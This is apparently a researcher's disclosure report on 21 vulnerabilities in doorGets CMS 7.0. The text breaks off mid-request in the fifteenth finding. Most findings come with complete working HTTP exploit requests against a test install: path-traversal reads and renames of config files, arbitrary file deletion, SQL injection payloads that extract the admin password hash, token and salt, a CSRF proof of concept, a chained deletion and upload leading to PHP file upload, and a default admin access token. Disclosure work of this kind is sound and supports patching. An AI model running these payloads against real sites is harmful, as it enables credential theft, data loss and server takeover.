###DoorGets CMS Multiple Vulnerability

####General description：

**[1]doorGets 7.0 has a sensitive information disclosure vulnerability in \fileman\php\copyfile.php. A remote unauthenticated attacker can exploit this vulnerability to obtain server-sensitive information.**

**[2]doorGets 7.0 has a sensitive information disclosure vulnerability in \fileman\php\copydir.php. A remote unauthenticated attacker can exploit this vulnerability to obtain server-sensitive information.**

**[3]doorGets 7.0 has a sensitive information disclosure vulnerability in \fileman\php\renamefile.php. A remote unauthenticated attacker can exploit this vulnerability to obtain server-sensitive information or make the server unserviceable.**

**[4]doorGets 7.0 has a sensitive information disclosure vulnerability in \fileman\php\movefile.php. A remote unauthenticated attacker can exploit this vulnerability to obtain server-sensitive information or make the server unserviceable.**

**[5]doorGets 7.0 has a sensitive information disclosure vulnerability in \fileman\php\downloaddir.php. A remote unauthenticated attacker can exploit this vulnerability to obtain server-sensitive information.**

**[6]doorGets 7.0 has a sensitive information disclosure vulnerability in \fileman\php\download.php. A remote unauthenticated attacker can exploit this vulnerability to obtain server-sensitive information.**

**[7]doorGets 7.0 has an arbitrary file deletion vulnerability in \fileman\php\deletefile.php.A remote unauthenticated attacker can exploit this vulnerability to delete arbitrary files.**

**[8]doorGets 7.0 has a SQL injection vulnerability in \doorgets\app\views\ajax\contactView.php. A remote normal registered user could exploit the vulnerability to obtain database sensitive information.**

**[9]doorGets 7.0 has a SQL injection vulnerability in \doorgets\app\views\ajax\commentView.php. A remote unauthorized attacker could exploit the vulnerability to obtain database sensitive information.**

**[10]doorGets 7.0 has an arbitrary file upload vulnerability.A remote normal registered users can use this vulnerability to upload backdoor files to control the server.**

**[11]doorGets 7.0 has a sensitive information disclosure vulnerability in /setup/temp/admin.php and /setup/temp/database.php. A remote unauthenticated attacker could exploit this vulnerability to obtain administrator's password.**

**[12]doorGets 7.0 has a cross-site request forgery vulnerability in \doorgets\app\requests\user\configurationRequest.php. A remote attacker can exploit this vulnerability to modify the "Google Analytics code".**

**[13]doorGets 7.0 has a default administrator credential vulnerability.A remote attacker can use this vulnerability to gain administrator privileges for the creation and modification of articles.**

**[14]doorGets 7.0 has a SQL injection vulnerability in \doorgets\app\requests\user\configurationRequest.php when action=analytics. Remote background administrator privilege user(or a user with permission to manage configuration analytics) could exploit the vulnerability to obtain database sensitive information.**

**[15]doorGets 7.0 has a SQL injection vulnerability in \doorGets_CMS_V7.0\doorgets\app\requests\user\modulecategoryRequest.php. Remote background administrator privilege user(or a user with permission to manage modulecategory) could exploit the vulnerability to obtain database sensitive information.**

**[16]doorGets 7.0 has a SQL injection vulnerability in \doorgets\app\requests\user\configurationRequest.php when action=network. Remote background administrator privilege user(or a user with permission to manage configuration network) could exploit the vulnerability to obtain database sensitive information.**

**[17]doorGets 7.0 has a SQL injection vulnerability in \doorgets\app\requests\user\modulecategoryRequest.php. Remote background administrator privilege user(or a user with permission to manage modulecategory) could exploit the vulnerability to obtain database sensitive information.**

**[18]doorGets 7.0 has a SQL injection vulnerability in \doorgets\app\requests\user\configurationRequest.php when action=siteweb. Remote background administrator privilege user(or a user with permission to manage configuration siteweb) could exploit the vulnerability to obtain database sensitive information.**

**[19]doorGets 7.0 has an arbitrary file deletion vulnerability in \doorgets\app\requests\user\configurationRequest.php. Remote background administrator privilege user can exploit this vulnerability to delete arbitrary files.**

**[20]doorGets 7.0 has a SQL injection vulnerability in \doorgets\app\requests\user\emailingRequest.php. Remote background administrator privilege user(or a user with permission to manage emailing) could exploit the vulnerability to obtain database sensitive information.**

**[21]doorGets 7.0 has web site physical path leakage vulnerability**

_ _ _

**Environment: **
windows/php 5.5.38/apache
doorGets CMS V7.0


_ _ _
**[1]**

In \fileman\php\copyfile.php, there is no permission verification operation for the user.

![1.png](./img/1.png)

Line 37 gets the source file to be copied.
Line 38 uses the MakeUniqueFilename function to restrict copying from overwriting existing files, and the name of the copied file is identical to that of the source file.Because the values of $newPath and $path are not filtered properly, arbitrary files can be copied across directories.

Copy the apache configuration file httpd.conf to /fileman/httpd.conf as follows:
```
POST /fileman/php/copyfile.php HTTP/1.1
Host: 127.0.0.1:8003
Connection: keep-alive
Content-Length: 146
Pragma: no-cache
Cache-Control: no-cache
Accept: application/json, text/javascript, */*; q=0.01
Origin: http://127.0.0.1:8003
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.26 Safari/537.36 Core/1.63.6788.400 QQBrowser/10.3.2864.400
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
DNT: 1
Referer: http://127.0.0.1:8003/fileman/
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=; roxyld=%2Ffileman%2FUploads; roxyview=list

f=%2Ffileman%2FUploads%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Ftong%2Fphpstudy%2FPHPTutorial%2FApache%2Fconf%2Fhttpd.conf&n=%2Ffileman%2FUploads%2F..
```

![2.png](./img/2.png)

Through the exploit, visit ```http://domain.com/fileman/httpd.conf``` and successfully get the content:

![3.png](./img/3.png)


**[2]**

In \fileman\php\copydir.php, there is no permission verification operation for the user.

![4.png](./img/4.png)

![5.png](./img/5.png)

Line 52 calls the copyDir function:

![6.png](./img/6.png)

Line 37 creates a new directory, line 44 copies the files in the source directory to the new directory, and does not filter the values of $newPath and $path, resulting in a file copy across directories.

You can copy the directory /conf of the apache configuration file to /fileman/conf by requesting the following:
```
POST /fileman/php/copydir.php HTTP/1.1
Host: 127.0.0.1:8003
Connection: keep-alive
Content-Length: 133
Pragma: no-cache
Cache-Control: no-cache
Accept: application/json, text/javascript, */*; q=0.01
Origin: http://127.0.0.1:8003
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.26 Safari/537.36 Core/1.63.6788.400 QQBrowser/10.3.2864.400
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
DNT: 1
Referer: http://127.0.0.1:8003/fileman/
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=; roxyld=%2Ffileman%2FUploads; roxyview=list

d=%2Ffileman%2FUploads%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Ftong%2Fphpstudy%2FPHPTutorial%2FApache%2Fconf&n=%2Ffileman%2FUploads%2F..
```
![7.png](./img/7.png)
Through the exploit, successfully copy the directory conf of the apache configuration file to /fileman/conf. You can obtain the content of the file by visiting ```http://domain.com/fileman/conf/httpd.conf```: 
![8.png](./img/8.png)


**[3]**

In \fileman\php\renamefile.php, there is no permission verification operation for the user.

![9.png](./img/9.png)

Line 34 determines whether the newly named file meets the criteria (forbidding renaming the file to. PHP file), and fails to filter the value of $path, resulting in file renaming across directories.

Modify /config/config.php to /fileman/Uploads/test.html by requesting:
```
POST /fileman/php/renamefile.php HTTP/1.1
Host: 127.0.0.1:8003
Connection: keep-alive
Content-Length: 91
Pragma: no-cache
Cache-Control: no-cache
Accept: application/json, text/javascript, */*; q=0.01
Origin: http://127.0.0.1:8003
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.26 Safari/537.36 Core/1.63.6788.400 QQBrowser/10.3.2864.400
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
DNT: 1
Referer: http://127.0.0.1:8003/fileman/
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=; roxyld=%2Ffileman%2FUploads; roxyview=list

f=%2Ffileman%2FUploads%2F..%2F..%2Fconfig%2Fconfig.php&n=..%2Ffileman%2FUploads%2Ftest.html
```

![10.png](./img/10.png)

Successfully change /config/config.php to /fileman/Uploads/test.html and go to ```http://domain.com/fileman/Uploads/test.html``` to get the content:

![11.png](./img/11.png)

At the same time, the website cannot provide services because of the lack of configuration files:

![12.png](./img/12.png)


**[4]**

In \fileman\php\movefile.php, there is no permission verification operation for the user.

![13.png](./img/13.png)

Line 36 limits the name of the new file.
Line 40 limits cannot overwrite existing files.
Line 42 file renaming did not filter the value of $newpath, which led to file renaming across directories.

Modify /config/config.php to /fileman/Uploads/test1.html by requesting:
```
POST /fileman/php/movefile.php HTTP/1.1
Host: 127.0.0.1:8003
Connection: keep-alive
Content-Length: 90
Pragma: no-cache
Cache-Control: no-cache
Accept: application/json, text/javascript, */*; q=0.01
Origin: http://127.0.0.1:8003
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.26 Safari/537.36 Core/1.63.6788.400 QQBrowser/10.3.2864.400
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
DNT: 1
Referer: http://127.0.0.1:8003/fileman/
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=; roxyld=%2Ffileman%2FUploads; roxyview=list

f=%2Ffileman%2FUploads%2F..%2F..%2Fconfig%2Fconfig.php&n=%2Ffileman%2FUploads%2Ftest1.html
```
![14.png](./img/14.png)

Successfully change /config/config.php to /fileman/Uploads/test1.html and get the contents of the file by visiting http://domain.com/fileman/Uploads/test1.html:

![15.png](./img/15.png)

At the same time, the website cannot provide services because of the lack of configuration files:

![16.png](./img/16.png)



**[5]**

In \fileman\php\downloaddir.php, there is no permission verification operation for the user.

![17.png](./img/17.png)

Line 41 calls the RoxyFile::ZipDir function:

![18.png](./img/18.png)

Line 167 calls the ZipAddDir function to get the $path specified directory file compressed into a .zip file, but does not filter the value of $path.

You can download the file under /config/ by requesting the following:```
http://domain.com/fileman/php/downloaddir.php?d=/fileman/Uploads/../../config```

![19.png](./img/19.png)

Successfully obtained the file under /config/:

![20.png](./img/20.png)


**[6]**

In \fileman\php\download.php, there is no permission verification operation for the user.

![21.png](./img/21.png)

Line 36 gets the $path specified file, but does not filter the $path value.

You can download the /config/config.php file by requesting:```
http://domain.com/fileman/php/download.php?f=/fileman/Uploads/../../config/config.php```

![22.png](./img/22.png)

Successfully obtained the contents of /config/config.php:

![23.png](./img/23.png)


**[7]**

In \fileman\php\deletefile.php, there is no permission verification operation for the user.

![24.png](./img/24.png)

Line 29 gets the value of $path.
Line 30 calls the verifyPath function and passes the $path in the function:

![25.png](./img/25.png)

Line 74 calls the checkPath function:

![26.png](./img/26.png)

The value obtained by getFilesPath() is "/fileman/Uploads".
It will determine whether the value of $path contains "/fileman/Uploads", and the limit is only allowed to delete files under "/fileman/Uploads", but because of filtering, the attacker can bypass the restriction to delete any file. 

You can delete the "/fileman/admin.json" file by requesting the following data:
```
POST /fileman/php/deletefile.php HTTP/1.1
Host: 127.0.0.1:8003
Connection: keep-alive
Content-Length: 38
Pragma: no-cache
Cache-Control: no-cache
Accept: application/json, text/javascript, */*; q=0.01
Origin: http://127.0.0.1:8003
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.26 Safari/537.36 Core/1.63.6788.400 QQBrowser/10.3.2864.400
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
DNT: 1
Referer: http://127.0.0.1:8003/fileman/
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=; roxyld=%2Ffileman%2FUploads; roxyview=list

f=%2Ffileman%2FUploads%2F../admin.json
```
Successfully deleted files by exploiting the vulnerability:

![27.png](./img/27.png)


**[8]**

In the getResponse function of \doorgets\app\views\ajax\contactView.php:

![28.png](./img/28.png)

Line 142 when $errors is empty and the POST data is not empty, line 156 calls the dbQI function and passes the $data. In this function:

![29.png](./img/29.png)

Line 165 calls the dbVQI function to splice the value of $data into a database query statement and assign it to $q.

![30.png](./img/30.png)

Line 167 passes $q into the query function to perform a database query directly.

The value obtained by the Params function will be processed as follows, '”< will be materialized, but \ will not be processed.

![31.png](./img/31.png)

Since we can control multiple parameters in the SQL statement, let the first parameter take \, the value will comment out the " after the statement, so that the second parameter can be injected.

Request the following data:
```
POST /ajax/index.php?uri=contact&action=sendForm&controller=contact HTTP/1.1
Host: 127.0.0.1:8003
Content-Length: 242
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: null
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.26 Safari/537.36 Core/1.63.6788.400 QQBrowser/10.3.2864.400
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
DNT: 1
Accept-Language: zh-CN,zh;q=0.9
Content-Type: application/x-www-form-urlencoded
Cookie: PHPSESSID=123455555
Connection: close

contact_inbox_email=todaro@localhost.com&contact_inbox_nom=4\&contact_inbox_sujet=,(select/**/1=(updatexml(1,concat(0x5e24,(select@@version),0x5e24),1))),6,18010101010,1551774101)#&contact_inbox_message=4444&contact_inbox_telephone=5555555555
```
The last SQL statement executed by this program is:
```
INSERT INTO `_dg_inbox` (`uri_module`,`lu`,`email`,`nom`,`sujet`,`message`,`telephone`,`date_creation`) VALUES ("contact","2","todaro@localhost.com","4\",",(select/**/1=(updatexml(1,concat(0x5e24,(select@@version),0x5e24),1))),6,18010101010,1551774101)#","4444","5555555555","1551777905");
```
The current database version obtained by SQL injection is 5.5.53:

![32.png](./img/32.png)


**[9]**

In the getResponse function of \doorgets\app\views\ajax\commentView.php:

![33.png](./img/33.png)

Line 166 defines the value of $data.

On line 182, add the value of $_POST['doorgets_comment_email'], $_POST['doorgets_comment_comment'] to $data['doorgets_comment_email'] and $data ['doorgets_comment_comment'].

Line 184, $data ['nom'] will get the user's "First name" value directly when the user has logged in, and the value of $_POST ['doorgets_comment_name'] if not logged in, and the user's message needs admin user auditing to be displayed on the home page.

![34.png](./img/34.png)

Line 192 calls the dbQI function and passes the parameter $data, and then calls the dbVQI function in the dbQI function to splice the $data data into SQL statements:

![35.png](./img/35.png)

Since the system does not do database anti-injection well, in the case that multiple parameters are controllable, the following parameters can be escaped by inserting \, which eventually leads to sql injection.

After logging in, visit ```http://domain.com/dg-user/?controller=account``` and modify your own "First name" as
```
,(select concat((select password from _users where id=7),(select token from _users where id=7),(select hex(salt) from _users where id=7))))#```

Then post a comment on the homepage of the website with the following comments:

![36.png](./img/36.png)

The SQL statement executed by the program is:
```
INSERT INTO `_dg_comments` (`uri_module`,`uri_content`,`stars`,`url`,`date_creation`,`validation`,`adress_ip`,`langue`,`email`,`comment`,`nom`) VALUES ("home","1111","0","/ajax/index.php?uri=news&action=sendForm&controller=comment&uri_module=home&lg=en&uri_content=1111&fcbz=1","1551860423","2","127.0.0.1","en","todaro@localhost.com","6677\",",(select concat((select password from _users where id=7),(select token from _users where id=7),(select hex(salt) from _users where id=7))))#");```

Then, the "password", "token", and "salt" values of the administrator obtained by the injection are displayed at the "First name" of the homepage comment content.
```select concat((select password from _users where id=7),(select token from _users where id=7),(select hex(salt) from _users where id=7))```
The injection results are as follows:

![37.png](./img/37.png)

The administrator's "password" is:```
ZDEwYmJjOWVkM2ViNDQwNzBlNmU0ODdhMWY3MzZjNWE2OGFjODEzYTVmYzRhZWZmNmMxMjRlZDBiYjY4M2UyYw==```
The administrator's "token" is:```
7490353fec596334094a185bba3d39ef```
The administrator's "hex(salt)" is:```
3C474D333F552A2D405E412A646642634F3C5B7D584B5B622A394821622F38313636655D50396B514031```
The data obtained by injection is consistent with the direct query in the database:

![38.png](./img/38.png)


**[10]**

In \fileman\php\upload.php, there is no permission verification operation for the user.

![39.png](./img/39.png)

Line 33 calls the verifyPath function to verify $path. The value of $_POST['d'] is required to contain "/fileman/Uploads". Due to the lack of filtering treatment, there is a problem of uploading files across directories.

![40.png](./img/40.png)

Line 41 gets the name of the uploaded file.
Line 45 calls the RoxyFile:: CanUploadFile function:

![41.png](./img/41.png)

Line 140 will determine whether the file is allowed to upload. The content of FORBIDDEN_UPLOADS is from \doorGets_CMS_V7.0\fileman\conf.json, as follows:

![42.png](./img/42.png)

FORBIDDEN_UPLOADS restricts .php file uploads, without restricting the upload of .json files, and limits the ability to overwrite existing files.

Try to delete the \doorGets_CMS_V7.0\fileman\conf.json file and leave the contents of FORBIDDEN_UPLOADS empty. This will enable the upload of .php files, but it will not work. The reasons are as follows:

![43.png](./img/43.png)

If the \doorGets_CMS_V7.0\fileman\conf.json file does not exist or is empty, it will exit directly.

The following is found in the \fileman\index.php file:

![44.png](./img/44.png)

Lines 12-14 get the information of the currently logged in user. Line 16 determines the type of the user. By default, all logged in users' $user['fileman'] are 'admin', and the program will copy \doorGets_CMS_V7.0\fileman\admin.json to \doorGets_CMS_V7.0\fileman\conf.json.

If you can control the contents of \doorGets_CMS_V7.0\fileman\admin.json, you can control the upload file type and finally upload the .php file.

The final exploit is as follows: first delete the \doorGets_CMS_V7.0\fileman\admin.json file using any file deletion vulnerability, and then upload the \doorGets_CMS_V7.0\fileman\admin.json file through the file upload function (modify the file and delete the php characters in FORBIDDEN_UPLOADS). Then log in to the user account and visit /fileman/index.php, and finally upload the .php file using the file upload function.


Use the arbitrary file deletion vulnerability to delete the \doorGets_CMS_V7.0\fileman\admin.json file. The request is as follows:
```
POST /fileman/php/deletefile.php HTTP/1.1
Host: 127.0.0.1:8003
Connection: keep-alive
Content-Length: 38
Pragma: no-cache
Cache-Control: no-cache
Accept: application/json, text/javascript, */*; q=0.01
Origin: http://127.0.0.1:8003
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.26 Safari/537.36 Core/1.63.6788.400 QQBrowser/10.3.2864.400
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
DNT: 1
Referer: http://127.0.0.1:8003/fileman/
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=; roxyld=%2Ffileman%2FUploads; roxyview=list

f=%2Ffileman%2FUploads%2F../admin.json
```
![45.png](./img/45.png)

Then upload the modified \doorGets_CMS_V7.0\fileman\admin.json file with the following request:
```
POST /fileman/php/upload.php HTTP/1.1
Host: 127.0.0.1:8003
Connection: keep-alive
Content-Length: 1974
Pragma: no-cache
Cache-Control: no-cache
Accept: */*
Origin: http://127.0.0.1:8003
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.26 Safari/537.36 Core/1.63.6788.400 QQBrowser/10.3.2864.400
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryyvbOyiQFuiy0akbE
DNT: 1
Referer: http://127.0.0.1:8003/fileman/
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=; roxyld=%2Ffileman%2FUploads; roxyview=list

------WebKitFormBoundaryyvbOyiQFuiy0akbE
Content-Disposition: form-data; name="action"

upload
------WebKitFormBoundaryyvbOyiQFuiy0akbE
Content-Disposition: form-data; name="method"

ajax
------WebKitFormBoundaryyvbOyiQFuiy0akbE
Content-Disposition: form-data; name="d"

/fileman/Uploads/..
------WebKitFormBoundaryyvbOyiQFuiy0akbE
Content-Disposition: form-data; name="files[]"; filename="admin.json"
Content-Type: image/jpeg


{
"FILES_ROOT":          "",
"RETURN_URL_PREFIX":   "",
"SESSION_PATH_KEY":    "",
"THUMBS_VIEW_WIDTH":   "140",
"THUMBS_VIEW_HEIGHT":  "120",
"PREVIEW_THUMB_WIDTH": "100",
"PREVIEW_THUMB_HEIGHT":"100",
"MAX_IMAGE_WIDTH":     "1000",
"MAX_IMAGE_HEIGHT":    "1000",
"INTEGRATION":         "tinymce4",
"DIRLIST":             "php/dirtree.php",
"CREATEDIR":           "php/createdir.php",
"DELETEDIR":           "php/deletedir.php",
"MOVEDIR":             "php/movedir.php",
"COPYDIR":             "php/copydir.php",
"RENAMEDIR":           "php/renamedir.php",
"FILESLIST":           "php/fileslist.php",
"UPLOAD":              "php/upload.php",
"DOWNLOAD":            "php/download.php",
"DOWNLOADDIR":         "php/downloaddir.php",
"DELETEFILE":          "php/deletefile.php",
"MOVEFILE":            "php/movefile.php",
"COPYFILE":            "php/copyfile.php",
"RENAMEFILE":          "php/renamefile.php",
"GENERATETHUMB":       "php/thumb.php",
"DEFAULTVIEW":         "list",
"FORBIDDEN_UPLOADS":   "zip js jsp jsb mhtml mht xhtml xht phtml php3 php4 php5 phps shtml jhtml pl sh py cgi exe application gadget hta cpl msc jar vb jse ws wsf wsc wsh ps1 ps2 psc1 psc2 msh msh1 msh2 inf reg scf msp scr dll msi vbs bat com pif cmd vxd cpl htpasswd htaccess",
"ALLOWED_UPLOADS":     "",
"FILEPERMISSIONS":     "0644",
"DIRPERMISSIONS":      "0755",
"LANG":                "auto",
"DATEFORMAT":          "dd/MM/yyyy HH:mm",
"OPEN_LAST_DIR":       "yes"
}
------WebKitFormBoundaryyvbOyiQFuiy0akbE--
```
(Note that "FORBIDDEN_UPLOADS" does not contain php)

![46.png](./img/46.png)

Log in to the user account and go to ```http://domain.com/fileman/index.php```. You will find that "FORBIDDEN_UPLOADS" of /fileman/conf.json does not contain “php”:

![47.png](./img/47.png)

Finally upload the .php file with the following request:

![48.png](./img/48.png)

Visit ```http://domain.com/fileman/test.php``` and find that the .php file was uploaded successfully:

![49.png](./img/49.png)


**[11]**

After the doorGets CMS is built, the administrator account password is deserialized and stored in the php file, but the file is not a php executable file, causing sensitive content to leak.

Request the following address:```
http://domain.com/setup/temp/admin.php
http://domain.com/setup/temp/database.php```

![50.png](./img/50.png)

![51.png](./img/51.png)


**[12]**

In \doorgets\app\requests\user\configurationRequest.php
Line 837 when $_GET['action']= analytics, due to the lack of the following statement to verify the token:
```if (!empty($this->doorGets->Form->i) && empty($this->doorGets->Form->e))```
An attacker can modify the "Google Analytics code" of a website through a CSRF attack.

If the administrator visits the following page, "Google Analytics code" will be changed to "3333":
```
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="http://127.0.0.1:8003/dg-user/?controller=configuration&action=analytics" method="POST" enctype="multipart/form-data">
      <input type="hidden" name="configuration_analytics_analytics" value="3333" />
      <input type="hidden" name="configuration_analytics_submit" value="Save" />
    </form>
	<script>document.forms[0].submit();</script>
  </body>
</html>
```

**[13]**

After the doorGets cms is created, the database table _users_access_token has several records by default:

![52.png](./img/52.png)

You can also get this value by downloading /setup/data/database.zip.

The administrator's id is 7, and his token is:```
H0XZlT44FcN1j9LTdFc5XRXhlF30UaGe1g3cZY6i1K9```

In the \doorgets\core\api\doorGetsApi.php:

![53.png](./img/53.png)

On line 72, call the isValidAccessToken function to get the current user, in this function:

![54.png](./img/54.png)

Line 349 obtains the access_token value through the POST request, and line 359 obtains the user data by querying the token value of the table _users_access_token.

Since the access_token we submitted is the administrator's access_token, the obtained user is the administrator user.

Then we can create a blog post with administrator privileges.

In the \doorgets\app\requests\api\blogRequest.php:

![55.png](./img/55.png)

Line 52 gets the current user as an administrator.

![56.png](./img/56.png)

Line 131 when the request is a POST request, the parameter is passed as required by line 141.

![57.png](./img/57.png)

Line 197 writes the blog's data to the database.

Request the following data:
```
POST /api/index.php?uri=blog&action=index&controller=blog&access_token=H0XZlT44FcN1j9LTdFc5XRXhlF30UaGe1g3cZY6i1K9 HTTP/1.1
Host: 127.0.0.1:8003
Content-Length: 1949
Cache-Control: max-age=0
Origin: http://127.0.0.1:8003
Upgrade-Insecure-Requests: 1
DNT: 1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryoECdPo4qJTIADcz5
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Referer: http://127.0.0.1:8003/dg-user/en/?controller=modulenews&uri=news&action=edit&id=1&lg=en&back=http%3A%2F%2F127.0.0.1%3A8003%2F%3Fnews%3Dnews-test-by-admin-1-en
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Cookie: PHPSESSID=1234
Connection: close

------WebKitFormBoundaryoECdPo4qJTIADcz5
Content-Disposition: form-data; name="active"

2
------WebKitFormBoundaryoECdPo4qJTIADcz5
Content-Disposition: form-data; name="titre"

news_test_by_guest1
------WebKitFormBoundaryoECdPo4qJTIADcz5
Content-Disposition: form-data; name="uri"

news-test-by-guest2
------WebKitFormBoundaryoECdPo4qJTIADcz5
Content-Disposition: form-data; name="article_tinymce"

news_test_by_guest3<audio controls="controls" style="display: none;"></audio>
------WebKitFormBoundaryoECdPo4qJTIADcz5
Content-Disposition: form-data; name="tags"

test,
------WebKitFormBoundaryoECdPo4qJTIADcz5
Content-Disposition: form-data; name="image_gallery"

#1550483193-doorgets5c6a7ef990f53.jpg;
------WebKitFormBoundaryoECdPo4qJTIADcz5
Content-Disposition: form-data; name="meta_titre"

news_test_by_guest4
------WebKitFormBoundaryoECdPo4qJTIADcz5
Content-Disposition: form-data; name="meta_description"

111
------WebKitFormBoundaryoECdPo4qJTIADcz5
Content-Disposition: form-data; name="title"

bbb5
------WebKitFormBoundaryoECdPo4qJTIADcz5
Content-Disposition: form-data; name="facebook_type"

article
------WebKitFormBoundaryoECdPo4qJTIADcz5
Content-Disposition: form-data; name="facebook_titre"

news_test_by_guest5
------WebKitFormBoundaryoECdPo4qJTIADcz5
Content-Disposition: form-data; name="description"

aaaa
------WebKitFormBoundaryoECdPo4qJTIADcz5
Content-Disposition: form-data; name="image"; filename="123.jpg"
Content-Type: image/jpeg

aaaaaaaaaaaaaaaaaaaaaaaaaa11111111111111111111111111111
------WebKitFormBoundaryoECdPo4qJTIADcz5
Content-Disposition: form-data; name="meta_facebook_image"

2222222222222222
------WebKitFormBoundaryoECdPo4qJTIADcz5
Content-Disposition: form-data; name="comments"

1
------WebKitFormBoundaryoECdPo4qJTIADcz5
Content-Disposition: form-data; name="modulenews_edit_submit"

Sauvegarder
------WebKitFormBoundaryoECdPo4qJTIADcz5--
```
You can create an article with the title "bbb5" and the content "news_test_by_guest3" with administrator privileges:```
http://domain.com/?blog=news-test-by-guest2-en```

![58.png](./img/58.png)

Similarly, file operations under \doorgets\app\requests\api\ can be operated with administrator privileges in this way.


**[14]**

In \doorgets\app\requests\user\configurationRequest.php:

![59.png](./img/59.png)

Line 837 enters the case when $_GET['action']= analytics.
Line 854 encodes the value of the array, but does not handle the key of the array.
Line 852 directly calls the dbQU function for database query operations.

Since only the value of the array is encoded, but not for the key, the attacker can use the key of the array for SQL injection.

After the administrator logs in, replace the following cookie and request:
```
POST /dg-user/?controller=configuration&action=analytics HTTP/1.1
Host: 127.0.0.1:8003
Connection: keep-alive
Content-Length: 457
Pragma: no-cache
Cache-Control: no-cache
Origin: http://127.0.0.1:8003
Upgrade-Insecure-Requests: 1
DNT: 1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryEAq599OKe9At35v5
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Referer: http://127.0.0.1:8003/dg-user/?controller=configuration&action=analytics
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Cookie: PHPSESSID=6laloptc1mdug324doe9j3g1n6


------WebKitFormBoundaryEAq599OKe9At35v5
Content-Disposition: form-data; name="configuration_analytics_analytics"

aaaaaaaaaa
------WebKitFormBoundaryEAq599OKe9At35v5
Content-Disposition: form-data; name="configuration_analytics_analytics=(select/**/user())/**/where/**/id=1#"

aaaaaaaaaa
------WebKitFormBoundaryEAq599OKe9At35v5
Content-Disposition: form-data; name="configuration_analytics_submit"

Save
------WebKitFormBoundaryEAq599OKe9At35v5--
```
The SQL statement executed by the program is:
```UPDATE `_website` SET analytics = 'aaaaaaaaaa', analytics=(select/**/user())/**/where/**/id=1# = 'aaaaaaaaaa' WHERE id = '1'  LIMIT 1;```

Then visit ```http://domain.com/dg-user/?controller=configuration&action=analytics```
You can see that the value of select user() obtained by injection is: root@localhost

![60.png](./img/60.png)

**[15]**

In \doorGets_CMS_V7.0\doorgets\app\requests\user\modulecategoryRequest.php:

![61.png](./img/61.png)

Line 155 calls the dbQI function and passes the parameter $dataNext for database query. Because there is no filtering, SQL injection is caused.

After the administrator logs in, visit ```http://domain.com/dg-user/?controller=modulecategory&uri=blog&lg=en```
Click below:

![62.png](./img/62.png)

After filling in the data, capture the packet, replace the obtained cookie and modulecategory_add_token with the following request, and then submit:
```
POST /dg-user/?controller=modulecategory&uri=blog&action=add HTTP/1.1
Host: 127.0.0.1:8003
Content-Length: 1482
Cache-Control: max-age=0
Origin: http://127.0.0.1:8003
Upgrade-Insecure-Requests: 1
DNT: 1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarylPbmXrBulFPAjyLA
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Referer: http://127.0.0.1:8003/dg-user/?controller=modulecategory&uri=blog&action=add
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Cookie: PHPSESSID=6laloptc1mdug324doe9j3g1n6
Connection: close

